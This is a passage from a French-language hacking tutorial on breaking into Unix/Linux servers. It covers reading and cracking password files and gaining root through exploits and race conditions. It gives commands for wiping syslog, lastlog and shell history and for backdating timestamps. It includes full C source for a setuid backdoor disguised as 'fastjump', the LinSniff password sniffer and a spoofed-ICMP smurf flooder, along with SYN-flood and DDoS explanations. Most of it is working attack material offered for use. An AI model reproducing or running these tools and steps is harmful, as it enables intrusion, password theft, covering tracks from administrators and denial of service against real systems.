dieu pour qu'il ne soit pas en mode shadow. (get ou cat etc/passwd :))
A ce propos, voici une liste des repertoires ou sont planqués
les 'vrais' fichier passwd, au cas ou etc/passwd serait en shadow 
en fonction de l'os du serveur (note : ces files ne sont lisibles que par le root,
sauf grave problème de sécurité mais ne rêvez pas.. ;o)


Liste des repertoires contenant les fichiers passwd cryptés 
(liste tirée de Phrack magazine)
************************************************************************
Unix                  Path                            Indication
-----------------------------------------------------------------
AIX 3                 /etc/security/passwd            !
       or             /tcb/auth/files/<first letter   #
                            of username>/<username>
A/UX 3.0s             /tcb/files/auth/?/*
BSD4.3-Reno           /etc/master.passwd              *
ConvexOS 10           /etc/shadpw                     *
ConvexOS 11           /etc/shadow                     *
DG/UX                 /etc/tcb/aa/user/               *
EP/IX                 /etc/shadow                     x
HP-UX                 /.secure/etc/passwd             *
IRIX 5                /etc/shadow                     x
Linux 1.1             /etc/shadow                     *
OSF/1                 /etc/passwd[.dir|.pag]          *
SCO Unix #.2.x        /tcb/auth/files/<first letter   *
                            of username>/<username>
SunOS4.1+c2           /etc/security/passwd.adjunct    ##username
SunOS 5.0             /etc/shadow
                      <optional NIS+ private secure maps/tables/whatever>
System V Release 4.0  /etc/shadow                     x
System V Release 4.2  /etc/security/* database
Ultrix 4              /etc/auth[.dir|.pag]            *
UNICOS                /etc/udb                        *
************************************************************************

Bon, on va dire que vous avez le fichier passwd, prenez maintenant John The Rippern
décrypter ces mots de passe comme on a vu tout à l'heure, trouver le password du
root, et loguez vous par ftp...
Cette méthode reste tout de même très abstreignante, vivement déconseillée...



2. Utiliser des exploits

Mais bon, la meilleure technique pour passer root, c'est quand même les exploits, 
plus précisément les buffer overflow. Vous vous en chopez un correspondant au 
système d'exploitation du serveur (faites appel à la commande uname -a pour 
deviner de quel système il s'agit, ou utilisez nmap :)), vous le placer dans 
votre repertoire sur le serveur, pis vous le compiler et l'executer.

Tit exemple pour les neuneus qui comprennent rien :
---------------------------------------------------------
>>> cd un_repertoire_sur_lequel_vous_avez_des_droits 
>>> put exploit.c
>>> gcc exploit.c -o exploit
>>> ./exploit (passez des arguments si c'est nécessaire)
[root] $ echo héhéhé :)
héhéhé
---------------------------------------------------------

Voilà vous êtes passé root :)



3. Les race condition

Ah, enfin une autre technique d'exploitation...
Comme son nom l'indique, une race condition est une "course" contre le système,
on va essayer de mettre celui-ci dans une situation particulière, dans laquelle
il est exploitable puis on va l'exploiter ; Il existe un grand nombre de race
conditions, on va tout de fois prendre un exemple, celui des problèmes de gestion
de signaux. Ces signaux sont un mécanisme qui permet de signaler à un programme
que quelque chose de particulier s'est produit. 

Par exemple, pout stopper l'execution d'un programme, on va effectuer la 
combinaison CTRL+Z, ainsi un signal SIGTSTP est envoyé au processus en cours.

Pour ce qui est des problèmes donc, et bien nous pouvons modifier le flux d'un
programme en cours d'execution. Une des plus célèbres vulnérabilités de ce type
est celle présente sur wu-ftpd v 2.4, qui autorise des utilisateurs quelconques
d'accèder aux fichiers en tant que root. Les gestionnaires de signaux de ce 
système permettaient de capter des signaux SIGPIPE lorsque la connection était
fermée, et de capter des signaux SIGURG lors d'une interruption de transfert de
fichiers. Le problème était, lors d'une déconnection utilisateur/serveur, un 
signal SIGPIPE étant donc envoyé au serveur FTP, le serveur réglait son UID 
effective sur 0 ; l'attaque consistait donc à envoyer un signal SIGURG, via la
commande ABOR, sur le serveur ftp au moment ou son uid effective était de 0, puis
d'empecher le serveur de nous déconnecter, afin d'avoir accès au système de fichiers
avec les droits root... Cet exemple est bel et bien une race condition, car le hacker
est face à deux problèmes en même temps : Envoyer un signal SIGURG après que le 
serveur ait mis son uid effective a zero, et interrompre le serveur avant qu'il 
puisse nous déconnecter. Bon, bien sûr, l'univers des race conditions ne se limite
pas aux problèmes de gestion de signaux, il y'a bien tant d'autres choses à 
découvrir, tant d'exploits à coder, tant de fichiers suid à pirater...

Mais on déjà s'en tenir là, ce type d'exploitation est certes efficace, mais plus
très utilisé de nos jours, et beaucoup de ces techniques sont devenues obsolétes...


Etes vous root après tout ça ? 
Si vous avez bien bossé, oui. Sinon, cessez d'en vouloir à la nasa, et 
changez de cible ! Bon, je plaisante, en vérité chaque système est 
exploitable, à partir du moment où : 
- vous savez bien programmer
- vous êtes calé en architecture réseau
- vous maitrisez parfaitement l'os du système cible
Bien sûr, cela ne s'appliquera pas à tous les systèmes, obtenir un root
sur le SunOs d'une entreprise de commerce spécialisée dans les exportations
agricoles vous sera plus facile que d'aller foutre la merde sur les AmigaOS
de la nasa... Bon maintenant, après le root, l'après root !!! :)



d) Aménager son accès

Une fois passé root, vous serez peut-être impatient de modifier quelques fichiers...
Attention malheureux ! C'est justement comme ça qu'on se fait prendre ; avant de
faire quoi que ce soit, on va d'abord remettre en place deux ou trois petites
choses, histoire de bien dormir sur ses deux grandes oreilles... (d'âne ?)


1. Attention aux logs

Il en existe trois types de logs, les syslogs, qui notent les messages envoyés au 
root par le systeme, le lastlog, qui ntoe les ips et les noms de tous les 
utilisateurs se connectant sur le serveur et les historiques.

On commence par les syslogs, pas trop dur :
-------------------------------------------------------------------------------------
$ >>> cat /etc/syslog.conf
$ >>> cat log | grep -v localdomain.com | grep -v adresse_ip > localname
$ >>> cat localname > log
$ >>> rm localname

Nous avons donc pu enlever le nom de notre machine dans le syslog.

On va maintenant rediriger les logs dans un endroit ou personne ne pourra les retrouver. 
D'abord, noter la date et l'heure du dernier changement de syslog.conf:

$ >>> cp/syslog.conf nom
$ >>> emacs syslog.conf

Ensuite on va tout rediriger dans /dev/null, le trou noir :p. Puis:
$ >>> killall -HUP syslogd

Maintenant on remet tout en place:
$ >>> mv nom syslog.conf
$ >>> touch -t yyyymmddhhmm.ss syslog.conf.
-------------------------------------------------------------------------------------

En ce qui concerne le lastlog, même si ça paraît impossible (le fichier
est sous forme de binaire, windows like :)), il y'a quand même une astuce
imparable qui consiste à se reloguer, depuis le serveur, sur sa propre
machine, de manière à faire disparaître la connection distante ;
>>> rlogin root@localhost.com

Enfin, pour terminer en beauté avec les historiques...
Ces fichiers enregistrent toutes les actions que vous 
faites avec votre minable shell root... 
Chaque shell possède un fichier d'historiques dans le répertoire de son utilisateur:

- sh: .sh_history
- csh: .history
- ksh: .sh_history
- bash: .bash_history
- zsh: .history
- tcsh: .history

Vous allez donc devoir en premier lieu, changer de shell pour effacer l'historique du shell 
précedent. Dans pratiquement tous les cas, votre shell sera sh. 

Maintenant regardons si le fichier .tcshrc existe, si oui, notons l'heure de sa dernière 
modification, puis faisons:

$ >>> mv .tcshrc .localname
$ >>> echo "set histfile=/dev/null" > .tcshrc
$ >>> tcsh

L'historique sera donc redirigée vers /dev/null. 
Il ne reste plus qu'à effacer du fichier .sh_history toutes les actions que 
l'on a faites depuis le début.

Puis, juste avant de partir, faites la manipulation inverse:
host ~> >>> mv .localname .tcshrc (ou rm.tcshrc si vous venez de le créer)
host ~> >>> touch -t yyyymmddhhmm.ss .tcshrc avec l'heure à laquelle il a été crée
host ~> >>> logout


Bon, ca va assurera déjà une protection minimale, sinon il n'est pas interdit
de concoter un petit script qui automatise toutes les commandes à taper...



2. Installer une backdoor

Evidemment, vous ne comptiez tout de même pas réutiliser votre minable
exploit à chaque fois que vous désireriez passer root sur le système !
On va donc fabriquer une backdoor, une "porte de derrière", qui vous
permettra d'entrer à votre guise sur le serveur avec des droits root...

On va se mettre à élaborer une backdoor qui vous donne un accès root
à chaque fois que vous l'executer en lui passant comme argument 
"rootme", pour faire passer le programme plus facilement...
Sans quoi les admins vont avoir de gros doutes...

Avec quelques conaissances en c, y'en a à peine pour 1 minute.
Note : faites attention à bien donner un nom qui fasse "vrai" à votre backdoor,
une backdoor apellée "ma_backdoor" risque d'éveiller beaucoup de soupçons...

----------------------------------------------------------------------------------
/* fastjump.c (sans commentaires...) */
/* exemple de backdoor */

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>


void main(int argc, char *argv[]) 
{
 
   if ( (argv[1]) && (!strcmp(argv[0],"fastjump")) && (!strcmp(argv[1],"rootme")) ) 
   {
      setuid(0);
      setgid(0);
      system("/bin/sh"); 
   } 

   else {
      printf("Segmentation Fault");  // mdr, si l'admin est bricoleur, il va surement 
                                        vouloir mettre ses sales pattes dans le code,
                                        à éviter donc.... :p
        }
}
----------------------------------------------------------------------------------
On compile donc :
$ gcc fastjump.c fastjump

On s'apprête maintenant à déplacer notre backdoor, dans un repertoire peu fréquenté
si possible, avant cela on va noter la date des dernières modifications apportées
à ce repertoire. C'est fait ? Très bien on bouge notre fastjump...

$ mv fastjump /usr/X11R6/bin   // X11R6, ça vous rapelle pas quelque chose ça ? lol
$ rm fastjump

On va ensuite changer ses permissions, le mette en suid :
$ chmod +s /usr/X11R6/bin/fastjump

Pour le mettre en suid, ensuite vous devrez changer la date du fichier.
Voilà, et à chaque fois que vous désirerez passer root allez dans le
repertoire usr/X11R6/bin et tapez :
>>> ./fastjump rootme 
Ou rootme est l'argument magique qui vous fera passer root ;)

Bon, à part ça il existe des programmes, apellés rootkits, qui automatisent 
toutes ces tâches, vous sécurise et installent une backdoor sur le serveur.
Tapez rootkit dans un moteur de recherche et vous verrez... (quoi? lol)

Cette volonté des hackers à vouloir se cacher sur le système est très 
problématique pour le serveur, car déterminer si un système a été corrompu
n'est pas toujours évident. Pour ça, il existe des utilitaires, tels que
LIDS (Linux Intrusion Detection System), un ids très puissant disponible
sur http://www.lids.org .
Mais faites attention, avec un accès root, les hacker peuvent aussi trafiquer
des commandes utilisateurs, comme on a vu avec nfs tout à l'heure, en mettant
des chevaux de troies à l'intérieur de commandes telles que ls, su, etc...

Mais la folie demesurée du hacker en mal de hacker ne s'arrête pas là...
Après s'être correctement planqué, il va vouloir modifier quelques fichiers,
installer un sniffer, placer des chevaux de troies, ou peut être même pire,
"crasher" le système (au moyen de commandes telles que rmdir /bin, rm -fr, 
etc...). Dans ce cas là, héhé pas de chance, vous êtes tombé sur un crasher
pur et dur... Rassurez vous, ce type de pirate n'est pas très répandu...



3. Les sniffers

Les sniffers sont des outils terribles car ils permettent d'analyser les
différentes trames circulant sur un réseau, aussi bien des trames Ethernet
que TCP/IP ou autre, en filtrant différent protocoles, genre rpass, rlogin...
Son utilisation est plutôt simple, on place le sniffer en tête de réseau, 
sur le serveur, on l'active et on attend...
En général, ces sniffers ne sniffent que les 200 premiers octets de chaque
trame, ce qui est d'ailleurs nettement suffisant pour choper des passwords
comme un ouf :) .
Lorsqu'une carte voit passer une trame, elle la "renifle" en examinant son 
enveloppe externe. La carte compare ensuite l'adresse MAC (adresse de la carte
réseau) de destination à la sienne , si elle ne lui appartient pas alors elle 
ne lit pas le paquets. Un sniffer utilise le mode promiscious pour sniffer, 
dans ce mode les cartes réseau vont transmettre toutes les trames à l'ordinateur.
Utiliser un sniffer sur un réseau ne modifie pas les caractéristiques de ce
réseau, c'est pour cela qu'il est difficile de voir si oui ou non les trames
d'un réseau sont sniffées...

En matière de sniffer, je vous conseille Esniff, codé par Phrack magazine 
(NDLR : encore eux !!!) qui reste un standard en la matière...

Plaisanterie mis à part, je vous propose le code source d'un sniffer sympatoche,
Linsniff.c, qui ne filtre que les mots de passe, utile en temps de guerre...

--------------------------------------------------------------------------------
/* 
LinSniffer 0.02 [BETA] 
Mike Edulla 
medulla@infosoc.com 
DO NOT REDISTRIBUTE 
*/ 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <sys/time.h> 
#include <netinet/in.h> 
#include <netdb.h> 
#include <string.h> 
#include <linux/if.h> 
#include <signal.h> 
#include <stdio.h> 
#include <arpa/inet.h> 
#include <linux/socket.h> 
#include <linux/ip.h> 
#include <linux/tcp.h> 
#include <linux/if_ether.h> 

int openintf(char *); 
int read_tcp(int); 
int filter(void); 
int print_header(void); 
int print_data(int, char *); 
char *hostlookup(unsigned long int); 
void clear_victim(void); 

struct etherpacket 
{ 
   struct ethhdr eth; 
   struct iphdr ip; 
   struct tcphdr tcp; 
   char buff[8192]; 
}ep; 

struct 
{ 
   unsigned long saddr; 
   unsigned long daddr; 
   unsigned short sport; 
   unsigned short dport; 
   int bytes_read; 
   char active; 
   time_t start_time; 
} victim; 

struct iphdr *ip; 
struct tcphdr *tcp; 
#define CAPTLEN 512 
#define TIMEOUT 30 

int openintf(char *d) 
{ 
   int fd; 
   struct ifreq ifr; 
   int s; 
   fd=socket(AF_INET, SOCK_PACKET, htons(0x800)); 

   if(fd < 0) 
      { 
      perror("cant get SOCK_PACKET socket"); 
      exit(0); 
      } 

   strcpy(ifr.ifr_name, d); 
   s=ioctl(fd, SIOCGIFFLAGS, &ifr); 

   if(s < 0) 
      { 
      close(fd); 
      perror("cant get flags"); 
      exit(0); 
      } 

   ifr.ifr_flags |= IFF_PROMISC; 
   s=ioctl(fd, SIOCSIFFLAGS, &ifr); 
   if(s < 0) perror("cant set promiscious mode"); 
   return fd; 
} 

int read_tcp(int s) 
   { 
   int x; 
   
   while(1) 
      { 
      x=read(s, (struct etherpacket *)&ep, sizeof(ep)); 
      if(x > 1) 
         { 
         if(filter()==0) continue; 
         x=x-54; 
         if(x < 1) continue; 
         return x; 
         } 
      } 
   }
 
int filter(void) 
{ 
   int p; 
   p=0; 
   if(ip->protocol != 6) return 0; 
   if(victim.active != 0) 
   if(victim.bytes_read > CAPTLEN) 
   { 
   printf("\n----- [CAPLEN Exceeded]\n"); 
   clear_victim(); 
   return 0; 
   } 
   if(victim.active != 0) 
   if(time(NULL) > (victim.start_time + TIMEOUT)) 
      { 
      printf("\n----- [Timed Out]\n"); 
      clear_victim(); 
      return 0; 
      } 
    if(ntohs(tcp->dest)==21) p=1; /* ftp */ 
    if(ntohs(tcp->dest)==23) p=1; /* telnet */ 
    if(ntohs(tcp->dest)==110) p=1; /* pop3 */ 
    if(ntohs(tcp->dest)==109) p=1; /* pop2 */ 
    if(ntohs(tcp->dest)==143) p=1; /* imap2 */ 
    if(ntohs(tcp->dest)==513) p=1; /* rlogin */ 
    if(ntohs(tcp->dest)==106) p=1; /* poppasswd */ 
    if(victim.active == 0) 
    if(p == 1) 
    
    if(tcp->syn == 1) 
    { 
    victim.saddr=ip->saddr; 
    victim.daddr=ip->daddr; 
    victim.active=1; 
    victim.sport=tcp->source; 
    victim.dport=tcp->dest; 
    victim.bytes_read=0; 
    victim.start_time=time(NULL); 
    print_header(); 
    } 
   if(tcp->dest != victim.dport) return 0; 
   if(tcp->source != victim.sport) return 0; 
   if(ip->saddr != victim.saddr) return 0; 
   if(ip->daddr != victim.daddr) return 0; 
  
   if(tcp->rst == 1) 
   { 
   victim.active=0; 
   alarm(0); 
   printf("\n----- [RST]\n"); 
   clear_victim(); 
   return 0; 
   } 

   if(tcp->fin == 1) 
   { 
   victim.active=0; 
   alarm(0); 
   printf("\n----- [FIN]\n"); 
   clear_victim(); 
   return 0; 
   } 

return 1; 
} 

int print_header(void) 
{ 
   puts(" "); 
   printf("%s => ", hostlookup(ip->saddr)); 
   printf("%s [%d]\n", hostlookup(ip->daddr), ntohs(tcp->dest)); 
} 

int print_data(int datalen, char *data) 
{ 
   int i=0; 
   int t=0; 
   victim.bytes_read=victim.bytes_read+datalen; 
   for(i=0;i != datalen;i++) 
   { 
   if(data[i] == 13) {puts(" ");t=0;} 
   if(isprint(data[i])) {printf("%c", data[i]);t++;} 
   if(t > 75) {t=0;puts(" ");} 
   } 
} 

main() 
{ 
   int s; 
   s=openintf("eth0"); 
   ip=(struct iphdr *)(((unsigned long)&ep.ip)-2); 
   tcp=(struct tcphdr *)(((unsigned long)&ep.tcp)-2); 
   signal(SIGHUP, SIG_IGN); 
   clear_victim(); 

   for(;;) 
   { 
   read_tcp(s); 
   if(victim.active != 0) print_data(htons(ip->tot_len)-sizeof(ep.ip)-sizeof(ep.tcp), ep.buff-2); 
   } 
} 

char *hostlookup(unsigned long int in) 
{ 
   static char blah[1024]; 
   struct in_addr i; 
   struct hostent *he; 
   i.s_addr=in; 
   he=gethostbyaddr((char *)&i, sizeof(struct in_addr),AF_INET); 
   if(he == NULL) strcpy(blah, inet_ntoa(i)); 
   else strcpy(blah, he->h_name); 
   return blah; 
} 

void clear_victim(void) 
{ 
   victim.saddr=0; 
   victim.daddr=0; 
   victim.sport=0; 
   victim.dport=0; 
   victim.active=0; 
   victim.bytes_read=0; 
   victim.start_time=0; 
} 
--------------------------------------------------------------------------------

L'élimination d'un sniffer est donc comparable à celle d'une backdoor, elle 
est très problématique. On peut faire appel à des programmes tels que Promisc
(http://geek-girl.com/bugtraq/1997_3/0411.html) pour détecter un sniffer
sur son réseau, et encore, ça ce n'est que pour des SunOs ou des solaris...


C'est donc la fin de ce "petit" d). Que pouvons nous faire d'autre à présent ?
Chercher à devenir root sur un autre système ? Ne soyez pas pessimistes, même
si on a vite fait de faire le tour du système de fichiers, de placer un sniffer,
des chevaux de troies et tutti quanti, on peut faire beaucoup de chose marrantes 
avec un root... Quoi par exemple ? C'est ce que je vous propose de découvrir dans
la dernière partie de ce chapitre, restez branchés...



e) Denial of service

Les attaques "dénis de service" consistent à faire planter un serveur.
A quoi cela peut il bien nous servir ? Et bien après la pose d'un sniffer,
d'un cheval de troies ou de toute autre backdoor sur un serveur, le système
aura besoin d'être redemarré pour que nos outils soient activés...
Bien entendu, ceci n'est que la vision optimiste des choses, il existe des
pirates (crashers) qui utilisent ce type d'attaques uniquement pour le 
plaisir... Il existe de nombreuses techniques de dos (dénial of service),
nous allons en voir quelques unes ici...


1. Syn flood

Pour comprendre la technique du syn flood, nous avons besoin de comprendre 
comment marche une connection tcp 'normale' ;

1. CLIENT ---envoie un paquet syn---> SERVEUR
2. CLIENT <--renvoie un paquet syn/ack--- SERVEUR
3. CLIENT ---envoie un paquet ack----> SERVEUR

Dans la première étape, un paquet syn est envoyé par le client désirant
se connecter à un port tcp quelconque du serveur. Dans cette étape, le
serveur est dans un état SYN_RECV, il attend donc le paquet syn

Dans la seconde étape, un paquet syn/ack est renvoyé par le serveur au 
client, vérifiant si le client est actif.

Dans la troisième étape, le client renvoie un paquet ack vers le serveur
pour confirmer qu'il existe. Si tout se passe bien, la connection est établie.

Une situation de syn flood se produit quand quelqu'un envoie un paquet syn spoofé,
c'est à dire avec une adresse ip source inexistante. Le serveur va donc essayer
de renvoyer un paquet syn/ack, puis va se mettre en état SYN_RECV, attendant une
réponse de la part du client. Comme celui ci n'existe pas, son adresse étant spoofé,
une liste de connections inétablies va s'accumuler sur le serveur... Faisant par
la suite "planter" celui ci... Cool hein ?
Cette technique est très pratique car vous n'avez pas besoin d'avoir une grande
bande passante pour la mettre en application...
Pour voir si son système est victime d'une attaque syn flood, on peut faire appel
à la commande "netstat", qui vous montrera les connections actives sur le système.

Cette technique a cependant tendance à marcher de moins en moins bien...
Mais elle a eu son heure gloire, dans l'univers des refus de service...



2. Technique du smurfing

Un type d'attaque qui nous interessera plus que le syn flood, c'est le smurfing.
La technique du smurfing repose sur le protocole ICMP (Internet Control Messages 
Protocol), son fonctionnement est des plus simples. En gros, cela consiste à 
à envoyer des paquets ICMP ECHO spoofés (sur l'ip du serveur cible) sur des 
serveurs broadcast, composant un réseau amplificateur. Tous les serveurs 
broadcast du réseau vont donc répondre, non pas à notre machine, mais à la 
machine cible (car nos paquets étaient spoofés). 
Le serveur victime va donc rapidement être saturé, pour finalement planter...
Tout comme les inondations cible, le smurfing ne demande pas que vous ayez 
beaucoup de bande passante, et ce qui fait la force de cette attaque.. C'est
que ca marche ! Mais vous vous demandez peut être comment ca marche...

Le protocole ICMP est employé par les hôtes et les routeurs pour échanger 
une information de contrôle, plus précisement pour délivrer un message d'erreur... 
Ces messages icmp sont transportés sur le réseau sous forme de datagrammes
icmp. Et voilà à quoi ressemble un datagramme icmp :

0 ______________________15-16________________________31
|       |                Message ICMP                 |
|en-tête|____________________________________________ |
|       |        |         |             |            |
|       |Type(8b)| Code(8b)|Checksum(16b)|Message(xb) |
|_______|________|_________|_____________|____________|


Ces datagrammes sont composés de quatre champs : le type, dans le cas
d'un smurf on utilisera donc ICMP_ECHO ; le code du paquet, qui sera 1 
; le checksum, codé sur 16 bytes, et le message.
L'art du spoofing icmp consiste à fabriquer des paquets icmp qui vont faire
croire à un système que la connection est perdue... C'est pourquoi le type
de paquet icmp employé sera 1, il correspond à une machine inaccessible.

Voici maintenant un exemple de smurfer, codé par un certain Lion7...
(que je salue au passage :))

---------------------------------------------------------------------------------

/******************************************/ 
/*            Ssmurf By Li0n7             */     
/*    contactez-moi: killer.kil@voila.fr  */
/*         http://www.rndghost.com        */ 
/*       ICMP SMURFER - ICMP SPOOFER      */ 
/* Copyright Li0n7 - Tous droits réservés */ 
/******************************************/ 

/* Déclaration des headers */ 

#include <stdio.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdlib.h>

/* Déclarations des variables et structures */ 

char *sprotocol;
char *sa;
char *da;
int nbrPaquets, listening=0, optval, nb=0;
struct hostent *source;
struct hostent *cible;
struct sockaddr_in false;
struct sockaddr_in dest;
struct icmphdr *icmp;
struct iphdr *ip;
char  *packet, *buffer;


/* Fonction chksum, thanks Nitr0gen */ 

unsigned short in_cksum(unsigned short *addr, int len)
	{
	    register int sum = 0;
	    u_short answer = 0;
	    register u_short *w = addr;
	    register int nleft = len;

	    while (nleft > 1)
	      {
		  sum += *w++;
		  nleft -= 2;
	      }

	    
	    if (nleft == 1)
	      {
		  *(u_char *) (&answer) = *(u_char *) w;
		  sum += answer;
	      }
	   
	    sum = (sum >> 16) + (sum & 0xffff);		
	    sum += (sum >> 16);		
	    answer = ~sum;		
	    return (answer);
	}


/* Vérifie l'existence des broadcasts et de la cible */ 

int dhosts(char *fa, char *fd)
{
  if ((source=gethostbyname(fa))==NULL)
  {
    perror("Hote source invalide");
  } else {
    bzero(&false, sizeof(false));
       false.sin_addr=*(struct in_addr*)source->h_addr;
  }

  if ((cible=gethostbyname(fd))==NULL)
  {
    perror("Broadcast invalide");
  } else {
    bzero(&dest, sizeof(dest));
    dest.sin_family=AF_INET;
    dest.sin_port=htons(random());
       dest.sin_addr=*(struct in_addr*)cible->h_addr;
  }
  return 0;
 }

/* Fonction forgeant les faux datagrammes */ 

char *bicmp(int sihl, int sversion, int stos, int sttl, int scode, int sechoi, int ssek, int schk)
{

        ip = (struct iphdr *) malloc(sizeof(struct iphdr));
        icmp     = (struct icmphdr *) malloc(sizeof(struct icmphdr));
        packet  = (char *) malloc(sizeof(struct iphdr) + sizeof(struct icmphdr));
        buffer  = (char *) malloc(sizeof(struct iphdr) + sizeof(struct icmphdr));

	ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

/* Création de l'header IP */ 

        ip->ihl     = sihl;
        ip->version = sversion;
        ip->tos     = stos;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
	ip->id      = htons(getuid());
	ip->ttl      = sttl;
	ip->protocol = IPPROTO_ICMP;
	ip->saddr    = false.sin_addr.s_addr;
	ip->daddr    = dest.sin_addr.s_addr;

/* Création de l'header ICMP */ 

	icmp->type = ICMP_ECHO;
	icmp->code = scode;
	icmp->un.echo.id = sechoi;
	icmp->un.echo.sequence = ssek;
	icmp->checksum = schk;
	icmp->checksum = in_cksum((unsigned short *)icmp,sizeof(struct icmphdr));

        ip->check    = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
	return (packet);
}

/* Fonction de smurfing */

int ismurf(char *ia, char *id, int paquets, int slisten, int broads)
{
  int        j, z, i, dihl, dversion, dtos, dttl, dcode, dechoi, dsek, dchk, sock, optval, pfailed=0, psucceed=0;
  char       *buf;
  char       *spaquet;

/* Création du datagramme par l'utilisateur attaquant */ 

	printf("IP ILH(5): ");
	scanf(" %d", &dihl);
	printf("IP VERSION(4): ");
	scanf(" %d", &dversion);
        printf("IP TOS(0): ");   
	scanf(" %d", &dtos);
        printf("IP TTL(255): ");
	scanf(" %d", &dttl);
        printf("ICMP CODE(1): ");
	scanf(" %d", &dcode);
        printf("ICMP ECHO.ID(0): ");
	scanf(" %d", &dechoi);
        printf("ICMP ECHO.SEQUENCE(0): ");
	scanf(" %d", &dsek);
        printf("ICMP CHECKSUM(0): ");
	scanf(" %d", &dchk);


/* Boucle d'envoie des requêtes ICMP */ 

	for(j=0;j<broads;j++)
	  {
	    printf("Serveur broadcast n°%d:", j+1);
	    scanf("%s", buf);
           for(i=0;i<paquets;i++)
	     {
	      dhosts(ia, buf);
	      bicmp(dihl, dversion, dtos, dttl, dcode, dechoi, dsek, dchk);
              sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
	      setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&optval,sizeof(int));
              if((sendto(sock,spaquet,ip->tot_len,0,(struct sockaddr *)&dest,sizeof(struct sockaddr)))<0)
	         {
	           printf("Erreur lors de l'envoie des paquets!\n");
	           pfailed++;
	      } else {
	           printf("Données envoyées!\n");
	           psucceed++;
	          }
	    }
	  close(sock);
	    }

/* Statistiques de l'attaque */ 
	  
	printf("\nStatistiques:\n");
	printf("Adresse source:                           %s.\n", ia);
	printf("Nombre de broadcasts:                     %d.\n", broads);
	printf("Nombres de paquets à envoyés par broad.:  %d.\n", paquets);
	printf("Nombres de paquets envoyés total:         %d.\n", paquets*broads);
	printf("Nombres de paquets correctement  envoyés: %d.\n", psucceed);
	printf("Nombres de paquets perdus:                %d.\n", pfailed);
          if(slisten!=1)
	    {
	      return 0;
	    }
	
/* Attend réponse de la cible, dans le cas d'une IP non spoofée */
	if (slisten==1)
	  {
	  if(recv(sock,buffer,sizeof(struct iphdr)+sizeof(struct icmphdr),0)>=0)
	     {	
              printf("Received the ECHO REPLY!\n");
	      return 0;
	      } else {
	      printf("Erreur, aucune réception.\n");
	      return 0;
	   }
	  }
	close(sock);
	return 0;
}

/* Fonction principale */ 

int main(int argc, char *argv[])
{
  if (argc < 2)
    {
      printf("\n\n++++++++++++++++++Ssmurf BY Li0n7+++++++++++++++++++++\n\n");
      printf("            [Présentation des arguments]               \n\n");
      printf("usage: ./smurf -s<SPOOFED_IP> -n<NBR PAQUETS> -l\n\n");
      printf("-s<SPOOFED_IP>: l'adresse falsifiée.\n");
      printf("-n<NBR_PAQUETS>: le nombre de paquets à envoyer.\n");
      printf("-b<NBR_SERVEURS>: le nombre de serveurs broadcasts.\n");
      printf("-l: listening, attend un réponse pour paquets icmp envoyés.\n");
      printf("www.rndghost.com - contactez moi: killer.kil@voila.fr\n\n");
      exit(-1);
    } else {

/* Récupère les arguments entrées par l'utilisateur attaquant */ 

      while( (argc > 1) && (argv[1][0]=='-'))
	{
	  switch(argv[1][1])
	    {
	    case 's':
	      sa=&argv[1][2];
	      break;
	    case 'n':
	      nbrPaquets=atoi(&argv[1][2]);
	      break;
	    case 'l':
	      listening=1;
	      break;
	    case 'b':
	      nb=atoi(&argv[1][2]);
	      if(nb==0)
		{
		  printf("Le nombre de serveurs ne peut être nul.\n");
		  exit(-1);
		}
	      break;
	    }
	  --argc;
	  ++argv;
	}
    }

/* Appel de la fonction smurf */ 

  ismurf(sa, da, nbrPaquets, listening, nb);
     return 0;
}    

/* 
Pour compiler :
gcc smurf.c -o smurf

usage: ./smurf -s[SPOOFED_IP] -n[NBR PAQUETS] -l 
-s[SPOOFED_IP]: l'adresse falsifiée. 
-n[NBR_PAQUETS]: le nombre de paquets à envoyer. 
-b[NBR_SERVEURS]: le nombre de serveurs broadcasts. 
-l: listening, attend un réponse pour paquets icmp. 
*/

---------------------------------------------------------------------------------

Bon, sur ce, j'espère que vous avez compris,
car maintenant nous allons passer aux attaques de refus de service distribués...
Qui elles, nécessitent que vous ayez un accès root sur un serveur, de préférence
relié à un réseau de grande bande passante...



3. Les attaques Ddos

Les attaques Ddos, dénis de service distribués, sont les attaques les plus vicieuses
à conçevoir... Les plus dures aussi, car elles demanderont au pirate que vous êtes
d'obtenir le plus d'accès root sur le plus de systèmes possible...
Ce type d'atttaques est le plus souvent dirigé par des outils automatisés ;
TFN et TFN2K en sont deux tristement célèbres exemples... Programmés par un 'gamin'
de 14 ans, Kevin Ackman, allias The Mixter, ces logiciels ont permis fin 2000 de 
faire planter les serveurs de Yahoo!, imaginez le trip...
TFN possède une partie client et une partie serveur, la partie serveur s'installe
automatiquement sur les systèmes infiltrés, et la partie client sert à effectuer 
un dos, un smurf comme un syn flood, au choix...

Voilà à quoi ressemble une attaque ddos classique ;

PIRATE -----------------------> SERVEURS INFILTRES ---------------------> SERVEUR CIBLE 
      (place la partie serveur)                     (effectuent un dos)

Ce shéma ci-dessus nous explique bien le procédé du ddos, je pense que je n'ai pas
de commentaires à rajouter là dessus...

Côté sécurisation, de nombreux utilitaires assurent la détection de TFN/TFN2K,
cherchez vous même ;))



e) Conclusion

Nous avons donc pu découvrir au fil de ce chapitre les méthodes les plus courantes
quand à l'intrusion sur des systèmes linux. Bien sûr, en matière de hacking, on 
aurait pu parler de plein de choses encore, comme le piratage de réseaux, de fire-
wall, le détournement de routeurs etc...
Nous avons aussi découvert qu'il existe une certaine linéarité dans l'univers du
hacking linux, comme le disait si bien je ne sais plus qui dans quelque e-mag
assez célèbre, en 1. on se loggue sur le serveur, et en 2. on utilise un exploit
trouvé n'importe où sur le web, pis on passe root.
Cette "linéarité" n'est pas forcément déplasainte quand on cherche à coder ses
propres exploits, trouver ses propres ses failles... Mais bon, les hackers qui
font ça se comptent sur les doigts d'une main, et je n'en fais absolument pas
partie... Ces techniques de hacking, parfoid assez complexes, repoussent de 
plus en plus les compétences des administrateurs. Auront nous le droit un jour
à un web ultra-sécurisé ? Un vrai cauchemard pour les hackers...
Mais rassurons nous, tant que les serveurs tournerons sous linux, tant il 
